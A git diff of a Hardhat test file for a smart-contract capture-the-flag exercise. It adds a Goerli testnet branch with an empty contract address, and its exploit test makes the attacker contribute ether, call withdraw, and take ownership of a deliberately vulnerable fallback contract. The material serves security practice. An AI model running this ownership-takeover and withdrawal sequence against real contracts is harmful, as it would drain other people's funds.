@@ -5,14 +5,26 @@ describe('[Challenge] Example Vuln', function () {
 
     let deployer, attacker;
     
-    before(async function () {
+    before(async () =>{
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
-        [deployer, attacker] = await ethers.getSigners();
-        const FallbackFactory = await ethers.getContractFactory('ExampleFallback', deployer);
-        this.target = await FallbackFactory.deploy();
+        const network = await ethers.provider.getNetwork();
+        const chainID = network.chainId
+        
+        if (chainID == 5){ // goerli testnet
+            /** connect to Dapp in goerli **/
+            [attacker] = await ethers.getSigners();
+            const InstanceFactory = await ethers.getContractFactory('ExampleFallback');
+            this.target = InstanceFactory.attach("");
+            
+        } else { // local network - hardhat  
+            /** local test **/
+            [deployer, attacker] = await ethers.getSigners();
+            const FallbackFactory = await ethers.getContractFactory('ExampleFallback', deployer);
+            this.target = await FallbackFactory.deploy();
+        }
     });
 
-    it('Exploit', async function () {
+    it('Exploit', async () => {
         /** CODE YOUR EXPLOIT HERE */
         const some_ether = ethers.utils.parseEther('0.0001', 'ether');
         // Contribute to get into whitelist
@@ -27,9 +39,8 @@ describe('[Challenge] Example Vuln', function () {
         await this.target.connect(attacker).withdraw();
     });
 
-    after(async function () {
+    after(async () => {
         /** SUCCESS CONDITIONS */
-        // Attacker should takeover the owner of the contract
         expect(await this.target.owner()).eq(attacker.address);
     });
 });
